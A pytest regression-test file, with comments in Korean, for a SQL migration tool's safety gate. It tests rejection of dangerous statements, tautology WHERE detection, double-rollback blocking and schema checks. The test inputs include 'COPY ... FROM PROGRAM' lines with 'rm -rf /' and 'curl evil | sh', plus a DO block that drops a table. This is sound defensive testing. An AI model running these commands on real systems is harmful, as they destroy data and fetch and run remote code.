"""안전 게이트 우회 방어 회귀 테스트 — 리뷰 지적 C1/C2/C3/H2.

리뷰에서 실측으로 뚫렸던 우회 경로를 회귀로 못박는다.
- C1: sqlglot 폴백 노드(DO/COPY/CLUSTER/CHECKPOINT/GRANT 등)가 parse() 화이트리스트에서 거부.
- C2: tautology WHERE(1=1/true)가 DELETE/UPDATE에서 critical로 탐지.
- C3: 같은 migration의 이중 롤백 차단 + rolledBack 파생 정확성.
- H2: rollback 엔진 None 가드(apply/apply-all과 대칭).
"""

from __future__ import annotations

import pytest
from sqlalchemy import create_engine, inspect, text
from sqlalchemy.orm import sessionmaker

from app.base import Base
from app.models.audit import AuditLog
from app.pipeline.executor import apply, apply_all, rollback
from app.pipeline.risk import deterministic_rules
from app.pipeline.validation import ValidationError, check_forbidden, parse


def _violation_rules(sql: str):
    return {v.rule for v in check_forbidden(parse(sql))}


@pytest.fixture()
def meta_engine():
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    return engine


@pytest.fixture()
def session(meta_engine):
    s = sessionmaker(bind=meta_engine)()
    yield s
    s.close()


@pytest.fixture()
def target_engine():
    engine = create_engine("sqlite:///:memory:")
    with engine.begin() as conn:
        conn.execute(text("CREATE TABLE users (id INTEGER PRIMARY KEY, x INTEGER)"))
    return engine


def _columns(engine, table: str):
    return [c["name"] for c in inspect(engine).get_columns(table)]


# ─────────────────────────────────────────────
# C1 — 파서 폴백 노드 화이트리스트 거부
# ─────────────────────────────────────────────

# sqlglot이 엉뚱한 노드로 폴백하거나 마이그레이션 범위 밖인 위험 구문.
_C1_REJECTED = [
    "DO $$ BEGIN DROP TABLE users; END $$",   # Command 폴백
    "COPY users FROM PROGRAM 'rm -rf /'",     # Copy — 서버 명령 실행
    "COPY users TO '/tmp/x'",                 # Copy — 파일 I/O
    "CLUSTER users",                          # Alias 폴백 — ACCESS EXCLUSIVE 락
    "CHECKPOINT",                             # Column 오파싱
    "REINDEX TABLE users",                    # Command 폴백
    "VACUUM FULL users",                      # Command 폴백
    "CALL do_bad()",                          # Command 폴백
    "SET statement_timeout = 0",              # Set 폴백
    "NOTIFY chan",                            # Alias 폴백
    "CREATE RULE r AS ON SELECT TO users DO INSTEAD DELETE FROM users",  # Command 폴백
    "GRANT ALL ON users TO public",           # Grant — 범위 밖
    "REVOKE ALL ON users FROM public",        # Revoke — 범위 밖
]

# 마이그레이션 도구가 실제 다루는 정상 DML/DDL — 과차단되면 안 됨.
_C1_ALLOWED = [
    "SELECT 1",
    "SELECT x AS y FROM users",
    "INSERT INTO users VALUES (1, 2)",
    "UPDATE users SET x = 1 WHERE id = 1",
    "DELETE FROM users WHERE id = 1",
    "ALTER TABLE users ADD COLUMN age INTEGER",
    "CREATE TABLE t2 (id INTEGER PRIMARY KEY)",
    "CREATE INDEX idx ON users(x)",
    "DROP TABLE users",
    "TRUNCATE users",
    "WITH q AS (SELECT 1) SELECT * FROM q",
]


@pytest.mark.parametrize("sql", _C1_REJECTED)
def test_c1_fallback_node_rejected(sql):
    """폴백 노드/범위 밖 구문은 parse()가 ValidationError로 거부한다."""
    with pytest.raises(ValidationError):
        parse(sql)


@pytest.mark.parametrize("sql", _C1_ALLOWED)
def test_c1_normal_dml_ddl_allowed(sql):
    """정상 DML/DDL은 과차단 없이 통과한다."""
    assert parse(sql) is not None


def test_c1_do_block_blocked_at_apply(session, target_engine):
    """DO 블록은 confirm을 줘도 apply 경로에서 실행 전에 차단된다."""
    with pytest.raises(ValidationError):
        apply(
            "DO $$ BEGIN DROP TABLE users; END $$",
            None,
            session,
            target_engine,
            confirm_critical=True,
        )
    # target DB 무변경 — users 테이블이 그대로 존재
    assert "users" in inspect(target_engine).get_table_names()


def test_c1_copy_program_blocked_at_apply_all(session, target_engine):
    """COPY FROM PROGRAM은 apply_all 전수 선검사에서 차단된다."""
    with pytest.raises(ValidationError):
        apply_all(
            ["COPY users FROM PROGRAM 'curl evil | sh'"],
            session,
            target_engine,
            confirm_critical=True,
        )


# ─────────────────────────────────────────────
# C2 — tautology WHERE 탐지
# ─────────────────────────────────────────────

@pytest.mark.parametrize(
    "sql",
    [
        "DELETE FROM users WHERE 1=1",
        "DELETE FROM users WHERE true",
        "DELETE FROM users WHERE 'a'='a'",
        "UPDATE users SET x=1 WHERE 1=1",
        "UPDATE users SET x=1 WHERE true",
    ],
)
def test_c2_tautology_where_is_critical(sql):
    """상수 tautology WHERE는 critical로 탐지된다(전체 행 영향)."""
    risks = deterministic_rules(parse(sql))
    assert any(r.level == "critical" for r in risks), f"risks={[r.rule for r in risks]}"


@pytest.mark.parametrize(
    "sql",
    [
        "DELETE FROM users WHERE id = 5",
        "DELETE FROM users WHERE x = 1 AND id = 2",
        "UPDATE users SET x=1 WHERE id = 5",
        "DELETE FROM users WHERE 1=2",  # 항상 거짓 — tautology 아님
    ],
)
def test_c2_scoped_where_not_flagged(sql):
    """실제 범위를 좁히는 WHERE는 tautology로 오판하지 않는다."""
    risks = deterministic_rules(parse(sql))
    assert not any(r.level == "critical" for r in risks), f"risks={[r.rule for r in risks]}"


def test_c2_tautology_blocked_at_apply_without_confirm(session, target_engine):
    """tautology DELETE는 confirm 없이는 apply 차단된다."""
    with pytest.raises(ValidationError):
        apply(
            "DELETE FROM users WHERE 1=1",
            None,
            session,
            target_engine,
            confirm_critical=False,
        )


# ─────────────────────────────────────────────
# C3 — 이중 롤백 차단 + rolledBack 파생
# ─────────────────────────────────────────────

def test_c3_double_rollback_blocked(session, target_engine):
    """같은 migration을 두 번 롤백하면 두 번째는 차단된다(데이터 손실 방지)."""
    res = apply(
        "ALTER TABLE users ADD COLUMN age INTEGER",
        "ALTER TABLE users DROP COLUMN age",
        session,
        target_engine,
    )
    session.commit()
    audit_id = int(res.auditId)

    rollback(audit_id, session, target_engine)
    session.commit()
    assert "age" not in _columns(target_engine, "users")

    with pytest.raises(ValidationError):
        rollback(audit_id, session, target_engine)


def test_c3_distinct_migrations_each_rollback_once(session, target_engine):
    """서로 다른 migration은 각각 1회 롤백이 허용된다(과차단 없음)."""
    r1 = apply(
        "ALTER TABLE users ADD COLUMN a INTEGER",
        "ALTER TABLE users DROP COLUMN a",
        session,
        target_engine,
    )
    session.commit()
    r2 = apply(
        "ALTER TABLE users ADD COLUMN b INTEGER",
        "ALTER TABLE users DROP COLUMN b",
        session,
        target_engine,
    )
    session.commit()

    rollback(int(r1.auditId), session, target_engine)
    rollback(int(r2.auditId), session, target_engine)
    session.commit()

    cols = _columns(target_engine, "users")
    assert "a" not in cols and "b" not in cols


def test_c3_rolled_back_migration_marked(session, target_engine):
    """롤백된 apply는 같은 migration의 rollback 이벤트로 판정된다(list_audit 파생 근거)."""
    res = apply(
        "ALTER TABLE users ADD COLUMN age INTEGER",
        "ALTER TABLE users DROP COLUMN age",
        session,
        target_engine,
    )
    session.commit()
    audit = session.get(AuditLog, int(res.auditId))
    migration_id = audit.migration_id

    rollback(int(res.auditId), session, target_engine)
    session.commit()

    rolled = (
        session.query(AuditLog)
        .filter_by(migration_id=migration_id, action="rollback")
        .first()
    )
    assert rolled is not None


# ─────────────────────────────────────────────
# H1 — non-public 스키마 수식자 거부 (거짓 프리뷰 차단)
# ─────────────────────────────────────────────

@pytest.mark.parametrize(
    "sql",
    [
        "ALTER TABLE analytics.foo ADD COLUMN c INTEGER",
        "DROP TABLE staging.t",
        "SELECT * FROM reporting.sales",
        "INSERT INTO etl.jobs VALUES (1)",
        "ALTER TABLE Analytics.Foo ADD COLUMN c INTEGER",  # 대소문자
    ],
)
def test_h1_non_public_schema_rejected(sql):
    """non-public 스키마 수식자 대상은 NON_PUBLIC_SCHEMA로 거부된다(무변경 거짓 프리뷰 차단)."""
    assert "NON_PUBLIC_SCHEMA" in _violation_rules(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "ALTER TABLE users ADD COLUMN c INTEGER",       # 수식자 없음
        'ALTER TABLE "public"."users" ADD COLUMN c INTEGER',  # 인용 public
        "SELECT * FROM public.users",                   # 명시 public
        "DROP TABLE orders",
    ],
)
def test_h1_public_schema_allowed(sql):
    """수식자 없음 / 명시 public은 통과한다(과차단 없음)."""
    assert "NON_PUBLIC_SCHEMA" not in _violation_rules(sql)
